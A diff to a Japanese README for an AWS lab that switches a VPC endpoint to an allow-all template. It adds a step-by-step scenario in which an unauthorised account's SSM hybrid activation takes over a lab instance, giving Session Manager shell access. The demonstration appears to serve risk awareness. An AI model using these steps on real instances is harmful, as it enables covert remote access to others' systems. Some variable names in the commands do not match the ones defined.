@@ -44,7 +44,7 @@ aws --profile ${PROFILE} --region ${REGION} \
 aws --profile ${PROFILE} --region ${REGION} \
     cloudformation create-stack \
         --stack-name SSMTestVpce \
-        --template-body "file://./src/vpce.yaml"
+        --template-body "file://./src/vpce-allowall.yaml"
 ```
 
 ### (2)-(c) インスタンス作成
@@ -103,4 +103,97 @@ aws configure set output json
 ```
 
 
-# 必要なVPCE
+## セキュリティリスクシナリオの確認
+Systems Managerのハイブリットアクティベーション機能を利用し、不正なAWSアカウントのSSMにVPCエンドポイント経由でSSM接続し、セッションマネージャで不正アクセスするシナリオを再現します。
+### (1) 不正アカウントでSystems Managerのハイブリットアクティベーション作成
+手元の作業PCで以下の手順で、不正なAWSアカウントにハイブリットアクティベーションを作成します。
+#### (1)-(a)事前準備
+```shell
+UNAUTH_PROFILE="<不正アカウントのAdmin権限のあるプロファイルを指定>"
+UNAUTH_REGION="${REGION}"
+```
+#### (1)-(b)ハイブリットアクティベーション用のIAMロール作成
+```shell
+#必要情報の取得
+AccountID=$(aws --profile ${OTHER_PROFILE} --output text sts get-caller-identity --query 'Account')
+
+# ハイブリットアクティベーション用のロール作成
+ASSUME_ROLE_JSON='{
+   "Version":"2012-10-17",
+   "Statement":[
+      {
+         "Sid":"",
+         "Effect":"Allow",
+         "Principal":{
+            "Service":"ssm.amazonaws.com"
+         },
+         "Action":"sts:AssumeRole",
+         "Condition":{
+            "StringEquals":{
+               "aws:SourceAccount":"'"${AccountID}"'"
+            },
+            "ArnEquals":{
+               "aws:SourceArn":"arn:aws:ssm:'"${OTHER_REGION}"':'"${AccountID}"':*"
+            }
+         }
+      }
+   ]
+}'
+# ロール作成
+aws --profile ${UNAUTH_PROFILE} \
+    iam create-role \
+        --role-name "SSMActivationServiceRole" \
+        --assume-role-policy-document "${ASSUME_ROLE_JSON}" \
+        --max-session-duration 43200
+
+#Policyのアタッチ
+aws --profile ${UNAUTH_PROFILE} \
+    iam attach-role-policy \
+        --role-name "SSMActivationServiceRole" \
+        --policy-arn arn:aws:iam::aws:policy/AmazonSSMManagedInstanceCore
+
+#Policyのアタッチ
+aws --profile ${UNAUTH_PROFILE} \
+    iam attach-role-policy \
+        --role-name "SSMActivationServiceRole" \
+        --policy-arn arn:aws:iam::aws:policy/AmazonSSMDirectoryServiceAccess
+
+```
+#### (1)-(c)ハイブリットアクティベーション作成
+ハイブリットアクティベーションを作成し、作成されたアクティベーションのIDとCODEを控えておきます。
+```shell
+aws --profile ${UNAUTH_PROFILE} --region ${UNAUTH_REGION} \
+    ssm create-activation \
+      --iam-role "SSMActivationServiceRole" \
+      --registration-limit 10
+
+# 上記を実行時のリターンで表示されるIDとCodeを控えておく
+# {
+#    "ActivationId": "xxxx",
+#    "ActivationCode": "xxxxx"
+# }
+```
+#### (1)-(d)インスタンスの追加
+SsmTestインスタンスのOSにログインし、上記のアクティベーション情報を利用して不正アカウントのSSMにSsmTestインスタンスを登録しいます。
+```shell
+#以下のコマンドは、SSMTestインスタンスにログインした状態で実行する。
+ID="<アクティベーションのActivationId>"
+CODE="<アクティベーションのActivationCode>"
+REGION="<アクティベーションを作成したリージョン>"
+
+#SSMエージェントの停止
+sudo systemctl stop amazon-ssm-agent
+
+#不正アカウントのアクティベーションへの登録
+sudo amazon-ssm-agent -register -code "${CODE}" -id "${ID}" -region "${REGION}"
+
+# 以下のメッセージが出力されればOK
+# INFO Successfully registered the instance with AWS SSM using Managed instance-id: mi-xxxxx"
+
+#SSMエージェント起動
+sudo systemctl start amazon-ssm-agent
+```
+#### (1)-(e)不正アカウントでの確認ンスタンスの追加
+不正アカウントのマネージメントコンソールで以下ができることを確認する。
+- Systems Managerのフリーとマネージャーに該当インスタンスが存在すること
+- セッションマネージャで該当インスタンスにアクセス可能であること
